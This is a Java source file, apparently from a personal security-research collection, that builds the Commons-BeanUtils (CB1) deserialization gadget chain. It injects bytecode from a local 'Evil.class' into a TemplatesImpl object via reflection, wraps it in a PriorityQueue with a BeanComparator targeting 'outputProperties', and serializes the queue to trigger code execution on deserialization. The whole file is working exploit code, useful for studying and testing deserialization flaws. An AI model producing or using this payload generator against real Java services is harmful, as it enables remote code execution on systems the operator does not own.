package com.rain;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CB1 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> aClass = templates.getClass();
        Field nameField = aClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"abc");
        Field tfactoryField = aClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());
        byte[] evil = Files.readAllBytes(Paths.get("/Users/long/Documents/github_doc/security_db/Java_relevant/code/gadget/CB_chains/src/main/java/Evil.class"));
        byte[][] code={ evil };
        Field bytecodesField = aClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates,code);

        BeanComparator comparator = new BeanComparator();
        PriorityQueue<Object> queue = new PriorityQueue<Object>(comparator);
        queue.add(1);
        queue.add(2);
        //通过反射设置 BeanComparator的 property的为 outputProperties
        Class<BeanComparator> beanComparatorClass = BeanComparator.class;
        Field propertyField = beanComparatorClass.getDeclaredField("property");
        propertyField.setAccessible(true);
        propertyField.set(comparator,"outputProperties");
        //通过反射设置 PriorityQueue 的queue值
        Class<PriorityQueue> priorityQueueClass = PriorityQueue.class;
        Field queueField = priorityQueueClass.getDeclaredField("queue");
        queueField.setAccessible(true);
        queueField.set(queue,new Object[]{templates,templates});

        Utils.serialize(queue);
        Utils.deserialize();
    }
}
